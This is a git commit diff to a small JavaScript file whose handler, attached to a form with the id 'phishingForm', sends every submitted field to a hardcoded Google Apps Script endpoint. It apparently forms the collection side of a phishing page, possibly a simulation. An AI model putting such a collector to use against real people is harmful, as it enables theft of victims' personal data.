8b53f0b8da0fac4f306ec3318abefc0991b9bde2
Miderson Santana <103211766+Miderson@users.noreply.github.com>
2025-06-07 10:34:55 -0300

    Update main.js

--- main.js
+++ main.js
@@ -1,22 +1,20 @@
+const scriptURL = "https://script.google.com/macros/s/AKfycbzBkJ8YjHr8sk7MjSykLDoGQxgRKiOAq8P_srBF97Uxd7MXqWx6XhafXFQYJ5oZyuGoPQ/exec";
+
 document.getElementById("phishingForm").addEventListener("submit", function(event) {
     event.preventDefault();
-
     const form = event.target;
     const data = new FormData(form);
-
-    // Substitua abaixo pela URL do seu Apps Script publicado
-    const scriptURL = "https://script.google.com/macros/s/AKfycbzBkJ8YjHr8sk7MjSykLDoGQxgRKiOAq8P_srBF97Uxd7MXqWx6XhafXFQYJ5oZyuGoPQ/exec";
 
     fetch(scriptURL, {
         method: "POST",
         body: data
     })
     .then(response => {
-        alert("✅ Dados enviados com sucesso! Aguarde o contato da equipe.");
+        alert("✅ Dados enviados com sucesso!");
         form.reset();
     })
     .catch(error => {
-        alert("❌ Erro ao enviar os dados. Verifique sua conexão.");
+        alert("❌ Erro ao enviar os dados.");
         console.error("Erro:", error);
     });
 });
